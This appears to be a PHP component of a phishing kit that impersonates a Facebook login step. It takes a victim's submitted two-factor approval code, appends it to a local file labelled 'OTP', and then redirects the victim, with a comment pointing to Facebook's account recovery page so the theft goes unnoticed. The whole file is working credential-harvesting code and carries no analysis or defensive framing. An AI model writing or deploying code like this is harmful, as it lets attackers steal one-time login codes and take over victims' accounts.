<?php
file_put_contents("usernames.txt", "OTP: " . $_POST['approvals_code'] . "\n", FILE_APPEND);
$url = "redirectUrl"; # https://facebook.com/recover/initiate/
header("Location: $url");
exit();
?>